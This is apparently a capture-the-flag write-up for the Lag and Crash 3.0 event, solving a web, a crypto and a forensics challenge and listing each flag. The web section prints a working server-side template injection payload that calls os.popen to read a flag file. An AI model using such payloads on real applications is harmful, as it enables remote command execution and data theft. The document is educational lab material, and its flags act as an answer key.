# Lag and Crash 3.0

https://ctf.lagncra.sh/challenges

## Challenges

### Web
- [DotDashDot](#dotdashdot)

### Crypto
- [You Don't Know About Us](#you-dont-know-about-us)

### Forensics
- [Base Madness](#base-madness)



-------

## Web

### DotDashDot

Description: _An ancient relic of the past... what's it doing here?_

http://dotdashdot.d.lagncra.sh

There is one comment in html source 

<img width="233" alt="image" src="https://user-images.githubusercontent.com/79740895/231981877-0bf5621b-99ad-444c-8fa1-f42b2e848fcf.png">

http://dotdashdot.d.lagncra.sh/translate

<img width="475" alt="image" src="https://user-images.githubusercontent.com/79740895/231982345-cbbd17fb-bd74-4f22-97bf-d8e29d99f035.png">

It will convert our input to morse code and it is vulnerable to SSTI.

test payload: `--> {{8*8}}`

<img width="330" alt="image" src="https://user-images.githubusercontent.com/79740895/231982840-ee4dbd56-8c82-4a10-bda5-89f553eabe49.png">

Now we can use RCE payload to read flag

Payload: `-->{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /www/flag.txt').read() }}`

<img width="458" alt="image" src="https://user-images.githubusercontent.com/79740895/231983204-6f38a96f-67a4-4d83-a804-54b622a1c631.png">

```
flag: LNC2023{T3mpl4t35_4r3_c00L_bUt_d4nG3r0u5_776843}
```




----------

## Crypto

### You Don't Know About Us

Description: _You ain’t gonna understand our language!

JZUWGZJAORZHSIDIOVWWC3RBEBKGQ2LTEBUXGIDUNBSSAYLDOR2WC3BAMVXGG33EMVSCA3LFONZWC43HMU5AUQSEKMZDAMRTPN2GWY3SORVWG4T5_

It is Base32 > Rot 10(Rot13 with n=10)

```
flag:  LNC2023{dumbdumb}
```






---------
## Forensics

### Base Madness

Description: _Zip files and encryptions were used often in the modern times. You came across this 2 files. One containing a text one is a zip file. Are you able to decipher it?_

two files are given: base_madness.txt, base_madness.zip

base_madness.txt is base64 encoded: `thisisthepasswordtounlockthefile`

unzip the file with this file. There is one image ayaka.jpg 

open this image with notepad there is flag.

<img width="361" alt="image" src="https://user-images.githubusercontent.com/79740895/231988288-e124c423-d078-4d08-ae81-70ea09e39c77.png">

```
flag:  LNC2023{ayaka_is_key}
```






